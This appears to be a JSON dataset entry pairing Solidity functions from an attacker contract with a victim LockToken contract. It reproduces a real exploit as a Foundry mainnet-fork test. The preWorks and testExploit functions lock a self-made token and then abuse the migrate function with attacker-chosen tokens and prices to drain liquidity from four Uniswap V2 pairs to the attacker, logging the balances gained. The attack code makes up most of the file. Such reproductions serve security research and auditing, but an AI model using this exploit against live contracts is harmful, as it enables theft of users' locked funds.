[
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "preWorks",
    "original_code": "    function preWorks() public payable {\n        uint256 _unlockTime = block.timestamp + 5;\n\n        // txId: https://etherscan.io/tx/0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f\n        // Lock 4000000000 selfmadeToken, return 4 new NFT ID\n        for (uint256 i; i < 4; ++i) {\n            uint256 nftId = ILockToken(LockToken).lockToken{value: 0.5 ether}(\n                selfmadeToken, address(this), 1_000_000_000, _unlockTime, false\n            );\n            migrateId[i] = nftId;\n        }\n\n        // txId-1: https://etherscan.io/tx/0x2972f75d5926f8f948ab6a0cabc517a05f0da5b53e20f670591afbaa501aa436\n        // txId-2: https://etherscan.io/tx/0xec75bb553f50af37f8dd8f4b1e2bfe4703b27f586187741b91db770ad9b230cb\n        // txId-3: https://etherscan.io/tx/0x79ec728612867b3d82c0e7401e6ee1c533b240720c749b3968dea1464e59b2c4\n        // txId-4: https://etherscan.io/tx/0x51185fb580892706500d3b6eebb8698c27d900618021fb9b1797f4a774fffb04\n        ILockToken(LockToken).extendLockDuration(migrateId[0], _unlockTime + 40_000);\n        ILockToken(LockToken).extendLockDuration(migrateId[1], _unlockTime + 40_000);\n        ILockToken(LockToken).extendLockDuration(migrateId[2], _unlockTime + 40_000);\n        ILockToken(LockToken).extendLockDuration(migrateId[3], _unlockTime + 40_000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15_837_893);\n        cheat.label(weth, \"WETH\");\n        cheat.label(usdc, \"USDC\");\n        cheat.label(dai, \"DAI\");\n        cheat.label(caw, \"CAW\");\n        cheat.label(tsuka, \"TSUKA\");\n        cheat.label(FEG_WETH_UniV2Pair, \"FEG/WETH Pair\");\n        cheat.label(USDC_CAW_UniV2Pair, \"USDC/CAW Pair\");\n        cheat.label(USDC_TSUKA_UniV2Pair, \"USDC/TSUKA Pair\");\n        cheat.label(KNDX_WETH_UniV2Pair, \"KNDX/WETH Pair\");\n        preWorks();\n        cheat.deal(address(this), 0); // set this balance is 0 to show effect\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        IV3Migrator.MigrateParams memory parms;\n        uint256 _liquidityToMigrate;\n\n        emit log_named_decimal_uint(\"[Before] Attack Contract ETH balance\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"[Before] Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[Before] Attack Contract CAW balance\", IERC20(caw).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\n            \"[Before] Attack Contract TSUKA balance\", IERC20(tsuka).balanceOf(address(this)), 18\n        );\n\n        // The exploit code could be written like a for loop, but we keep it simple to let you could do some debugging here.\n        // ==================== Migrate FEG_WETH_UniV2Pair to V3 ====================\n        _liquidityToMigrate = IERC20(FEG_WETH_UniV2Pair).balanceOf(LockToken);\n        parms = IV3Migrator.MigrateParams({\n            pair: FEG_WETH_UniV2Pair,\n            liquidityToMigrate: _liquidityToMigrate,\n            percentageToMigrate: 1, // 1%\n            token0: selfmadeToken,\n            token1: weth,\n            fee: 500,\n            tickLower: -100,\n            tickUpper: 100,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp,\n            refundAsETH: true\n        });\n\n        ILockToken(LockToken).migrate(migrateId[0], parms, true, newPriceX96, false);\n\n        //console.log(\"\\t[DEBUG]After migrated FEG_WETH_UniV2Pair, Attack Contract ETH balance\", address(this).balance);\n\n        // ==================== Migrate USDC_CAW_UniV2Pair to V3 ====================\n        _liquidityToMigrate = IERC20(USDC_CAW_UniV2Pair).balanceOf(LockToken);\n        parms = IV3Migrator.MigrateParams({\n            pair: USDC_CAW_UniV2Pair,\n            liquidityToMigrate: _liquidityToMigrate,\n            percentageToMigrate: 1,\n            token0: usdc,\n            token1: caw,\n            fee: 500,\n            tickLower: -100,\n            tickUpper: 100,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp,\n            refundAsETH: true\n        });\n\n        ILockToken(LockToken).migrate(migrateId[1], parms, true, newPriceX96, false);\n\n        uint256 usdc_bal = IERC20(usdc).balanceOf(address(this));\n\n        if (usdc_bal > 0) {\n            swapUsdcToDai();\n        }\n\n        //console.log(\"\\t[DEBUG]After migrated USDC_CAW_UniV2Pair, Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)));\n        //console.log(\"\\t[DEBUG]After migrated USDC_CAW_UniV2Pair, Attack Contract CAW balance\", IERC20(caw).balanceOf(address(this)));\n\n        // ==================== Migrate USDC_TSUKA_UniV2Pair to V3 ====================\n        _liquidityToMigrate = IERC20(USDC_TSUKA_UniV2Pair).balanceOf(LockToken);\n        parms = IV3Migrator.MigrateParams({\n            pair: USDC_TSUKA_UniV2Pair,\n            liquidityToMigrate: _liquidityToMigrate,\n            percentageToMigrate: 1,\n            token0: usdc,\n            token1: tsuka,\n            fee: 500,\n            tickLower: -100,\n            tickUpper: 100,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp,\n            refundAsETH: true\n        });\n        ILockToken(LockToken).migrate(migrateId[2], parms, true, newPriceX96, false);\n\n        usdc_bal = IERC20(usdc).balanceOf(address(this));\n\n        if (usdc_bal > 0) {\n            swapUsdcToDai();\n        }\n\n        //console.log(\"\\t[DEBUG]After migrated USDC_TSUKA_UniV2Pair, Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)));\n        //console.log(\"\\t[DEBUG]After migrated USDC_TSUKA_UniV2Pair, Attack Contract TSUKA balance\", IERC20(caw).balanceOf(address(this)));\n\n        //// ==================== Migrate KNDX_WETH_UniV2Pair to V3 ====================\n        _liquidityToMigrate = IERC20(KNDX_WETH_UniV2Pair).balanceOf(LockToken);\n        parms = IV3Migrator.MigrateParams({\n            pair: KNDX_WETH_UniV2Pair,\n            liquidityToMigrate: _liquidityToMigrate,\n            percentageToMigrate: 1,\n            token0: selfmadeToken,\n            token1: weth,\n            fee: 500,\n            tickLower: -100,\n            tickUpper: 100,\n            amount0Min: 0,\n            amount1Min: 0,\n            recipient: address(this),\n            deadline: block.timestamp,\n            refundAsETH: true\n        });\n\n        ILockToken(LockToken).migrate(migrateId[3], parms, true, newPriceX96, false);\n\n        //console.log(\"\\t[DEBUG] After migrated KNDX_WETH_UniV2Pair, Attack Contract ETH balance\", address(this).balance);\n\n        // ===========================================================================\n\n        emit log_named_decimal_uint(\"[After] Attack Contract ETH balance\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"[After] Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[After] Attack Contract CAW balance\", IERC20(caw).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[After] Attack Contract TSUKA balance\", IERC20(tsuka).balanceOf(address(this)), 18);\n    }\n\n    // Function 0xf9b65204\n",
    "description": ""
  },
  {
    "contract/interface": "ILockToken",
    "source_type": "victim_contract",
    "function_name": "extendLockDuration",
    "original_code": "    function extendLockDuration(\n        uint256 _id,\n        uint256 _unlockTime\n    )\n    public\n    {\n        require(_unlockTime < 10000000000);\n        require(_unlockTime > lockedToken[_id].unlockTime);\n        require(!lockedToken[_id].withdrawn);\n        require(msg.sender == lockedToken[_id].withdrawalAddress);\n        \n        //set new unlock time\n        lockedToken[_id].unlockTime = _unlockTime;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "ILockToken",
    "source_type": "victim_contract",
    "function_name": "lockToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILockToken",
    "source_type": "victim_contract",
    "function_name": "migrate",
    "original_code": "",
    "description": ""
  }
]